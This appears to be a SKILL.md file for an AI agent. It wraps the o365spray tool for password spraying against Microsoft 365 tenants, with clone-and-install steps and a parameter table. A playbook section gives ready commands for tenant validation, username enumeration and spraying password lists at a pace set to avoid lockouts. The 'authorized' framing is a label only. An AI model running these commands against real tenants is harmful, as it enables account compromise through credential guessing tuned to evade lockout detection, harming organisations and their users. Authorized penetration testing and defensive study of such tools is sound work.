---
name: o365spray-m365
description: "Authorized M365 tenant password spraying. Signals: brute force, password spraying, M365 username enumeration, lockout rate control."
zh-signals: "o365spray: M365 租户口令喷洒(授权)。信号:暴力破解,口令喷射,M365 用户名枚举,防锁定节奏控制。"
when-to-use: >-
  Use when performing authorized password spraying against a Microsoft 365 tenant, including
  tenant validation, username enumeration and lockout-aware spraying.
---

# o365spray

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/0xZDH/o365spray
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/0xZDH/o365spray && cd o365spray && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `--enum -U users.txt` | M365 username enumeration |
| `--spray -U users.txt -P passwords.txt` | Password spraying |
| `--count 1 --lockout 15` | Lockout-aware rate control |
| `-v` | Show every request |
| `--validate` | First validate that the tenant is M365 |

## Attack Scenario Playbook

### M365 tenant password spraying (authorized)

```bash
python3 o365spray.py --validate -e target.com
python3 o365spray.py --enum -U users.txt
python3 o365spray.py --spray -U valid.txt -P seasons.txt --count 1 --lockout 15
```

## Notes

Respects Microsoft lockout policies (--lockout); enumeration relies on AutoDiscover response differences, while spraying goes through the OAuth2 authentication endpoint.
